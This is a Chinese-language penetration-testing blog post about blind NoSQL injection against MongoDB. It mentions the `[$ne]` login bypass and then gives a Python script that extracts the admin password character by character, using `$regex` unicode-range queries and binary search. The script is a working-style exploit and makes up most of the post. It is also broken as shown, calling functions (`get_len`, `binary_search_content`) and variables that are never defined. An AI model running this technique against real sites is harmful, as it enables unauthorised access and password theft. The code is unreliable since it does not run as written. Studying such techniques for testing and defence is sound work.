---
title: MongoDB noSQLInjection with Binary Search
date: 2022-11-15T14:35:47+08:00
draft: false
url: "/2022/11/15/mongodb-nosqlinjection-with-binary-search/"
categories:
  - 網頁安全
  - 滲透測試
showToc: true
TocOpen: false
---

MongoDB 上面的 Injection 通常都可以直接使用 `[$ne]` 來做萬用解，但如果我們的目標不只是登入，而是想要 query 到指定目標的話，參考 [HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection) 可以看出。在 Blind 的情境底下，可以透過 regex 的方法來進行解答。

不過 [HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection) 或是 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) 中，使用的方法通常都是直接對 strings 進行爆破。

這會出現耗時，以及遇到 Regex 保留字時的問題。因此，我透過 regex 的 unicode 功能，寫了一款類似於傳統 SQL injection 中，透過 Binary Search 的方法來取得密碼，廢話不多說，直接上 Code。 使用上來看，只需要變更 query 函數中的條件，即可。

```python
import requests
import urllib.parse

def query(q):
    res = requests.get(r"http://127.0.0.1:8791/?user=admin&pass[$regex]=" + q)
    if "Success" in res.text:
        return True
    else:
        return False

def binary_search(left, right, query_s, query_f, v=1):
    while right - left > 3: #  4:
        guess = int(left+(right-left)/2)

        old_left = left
        left = guess
        command = urllib.parse.quote(r"^.{%s}[\x{%s}-\x{%s}].{%s}" % (index, f"{hex(int(left))[2:]:0>4}", f"{hex(int(right))[2:]:0>4}", length-index-1))
        if query(command):
            left = guess
        else:
            right = guess
            left = old_left
        print(f"{left} ~ {right}" , end="\r")

    for i in range(left,right+1):
        command = urllib.parse.quote(r"^.{%s}[\x{%s}].{%s}" % (index, f"{hex(int(i))[2:]:0>4}", length-index-1))
        # print(command)
        if query(command):
            print(f"[!] Answer: {i} ({chr(i)})")
            return i

length = get_len()
print(f"String Length = {length}")

r = []
for i in range(length):
    r.append(chr(binary_search_content(index=i,length=length)))

print(''.join(r))
```
